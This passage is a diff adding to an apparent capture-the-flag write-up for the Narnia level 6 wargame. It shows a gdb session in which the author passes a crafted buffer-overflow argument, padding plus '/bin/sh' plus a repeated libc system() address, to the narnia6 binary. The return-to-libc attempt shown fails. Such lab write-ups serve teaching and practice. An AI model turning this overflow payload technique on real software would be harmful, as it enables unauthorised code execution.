@@ -227,3 +227,19 @@ sh: 1: p.��p.��p.��: not found
 (gdb) 
 
 Nice! so we are visiting system(), now we need to get the parameter to be "/bin/sh" as per the definition of system()
+
+(gdb) r BBBBBBBB $(python -c 'print "A"*8+"/bin/sh"+"A"+"\x70\x2e\xe6\xf7"*5')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /narnia/narnia6 BBBBBBBB $(python -c 'print "A"*8+"/bin/sh"+"A"+"\x70\x2e\xe6\xf7"*5')
+
+Breakpoint 8, 0xf7e62e70 in system () from /lib32/libc.so.6
+(gdb) c
+Continuing.
+sh: 1: /bin/shAp.��p.��p.��p.��p.��: not found
+
+Breakpoint 5, 0x080486bb in main ()
+(gdb) c
+Continuing.
+[Inferior 1 (process 1108) exited with code 01]
+(gdb) 
